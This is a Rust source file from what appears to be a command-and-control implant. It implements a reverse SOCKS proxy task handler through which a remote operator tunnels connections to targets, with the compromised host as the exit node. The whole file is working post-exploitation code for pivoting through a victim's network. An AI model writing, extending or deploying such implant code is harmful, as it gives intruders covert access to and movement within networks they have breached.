//! SOCKS proxy task handler
//!
//! Handles the "socks" task type for reverse proxy operations.
//! The implant acts as the exit node, connecting to targets on behalf of the operator.
//!
//! Uses a default session (ID=1) that is auto-created on first connect.

use crate::error::{ImplantError, ImplantResult};
use protocol::{SocksTask, SocksResult, socks_task::Operation};
use std::sync::atomic::{AtomicU32, Ordering};

/// Default session ID for reverse proxy
static DEFAULT_SESSION: AtomicU32 = AtomicU32::new(0);

/// Ensure default session exists, creating it if needed
fn ensure_session() -> u32 {
    let session_id = DEFAULT_SESSION.load(Ordering::SeqCst);
    if session_id != 0 {
        // Check if session still exists
        if mod_socks::get_session(session_id).is_some() {
            return session_id;
        }
    }

    // Create new default session (30s timeout, allow DNS)
    match mod_socks::start_session(30, true) {
        Ok(new_id) => {
            DEFAULT_SESSION.store(new_id, Ordering::SeqCst);
            new_id
        }
        Err(_) => 0, // Will cause error in caller
    }
}

/// Execute a SOCKS proxy task
pub fn execute_socks_module(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    let task: SocksTask = protocol::decode(task_data)
        .map_err(|e| ImplantError::Task(format!("failed to decode SocksTask: {}", e)))?;

    let operation = task.operation
        .ok_or_else(|| ImplantError::Task("SocksTask missing operation".into()))?;

    let result = match operation {
        Operation::Connect(conn) => execute_connect(conn.channel_id, &conn.target_host, conn.target_port),
        Operation::Data(data) => execute_data(data.channel_id, &data.data),
        Operation::Disconnect(disc) => execute_disconnect(disc.channel_id),
    };

    Ok(protocol::encode(&result))
}

fn execute_connect(channel_id: u32, target_host: &str, target_port: u32) -> SocksResult {
    let session_id = ensure_session();
    if session_id == 0 {
        return SocksResult {
            channel_id,
            success: false,
            data: None,
            error: Some("failed to create SOCKS session".into()),
        };
    }

    let request = mod_socks::ConnectRequest {
        channel_id,
        target_host: target_host.to_string(),
        target_port: target_port as u16,
    };

    let result = mod_socks::handle_connect(session_id, &request);

    SocksResult {
        channel_id: result.channel_id,
        success: result.success,
        data: None,
        error: result.error,
    }
}

fn execute_data(channel_id: u32, data: &[u8]) -> SocksResult {
    let session_id = ensure_session();
    if session_id == 0 {
        return SocksResult {
            channel_id,
            success: false,
            data: None,
            error: Some("no active SOCKS session".into()),
        };
    }

    // Send data to target if provided
    if !data.is_empty() {
        let channel_data = mod_socks::ChannelData {
            channel_id,
            data: data.to_vec(),
            eof: false,
        };

        if let Err(e) = mod_socks::send_channel_data(session_id, &channel_data) {
            return SocksResult {
                channel_id,
                success: false,
                data: None,
                error: Some(format!("send failed: {}", e)),
            };
        }
    }

    // Receive any available response data
    let mut buf = vec![0u8; 65536]; // 64KB buffer
    match mod_socks::recv_channel_data(session_id, channel_id, &mut buf) {
        Ok(bytes_read) => SocksResult {
            channel_id,
            success: true,
            data: if bytes_read == 0 { None } else { Some(buf[..bytes_read].to_vec()) },
            error: None,
        },
        Err(e) => {
            // Timeout/WouldBlock is not an error - just means no data available
            let err_str = e.to_string();
            if err_str.contains("timeout") || err_str.contains("WouldBlock") {
                SocksResult {
                    channel_id,
                    success: true,
                    data: None,
                    error: None,
                }
            } else {
                SocksResult {
                    channel_id,
                    success: false,
                    data: None,
                    error: Some(format!("recv failed: {}", e)),
                }
            }
        }
    }
}

fn execute_disconnect(channel_id: u32) -> SocksResult {
    let session_id = ensure_session();
    if session_id == 0 {
        return SocksResult {
            channel_id,
            success: false,
            data: None,
            error: Some("no active SOCKS session".into()),
        };
    }

    mod_socks::close_channel(session_id, channel_id);

    SocksResult {
        channel_id,
        success: true,
        data: None,
        error: None,
    }
}
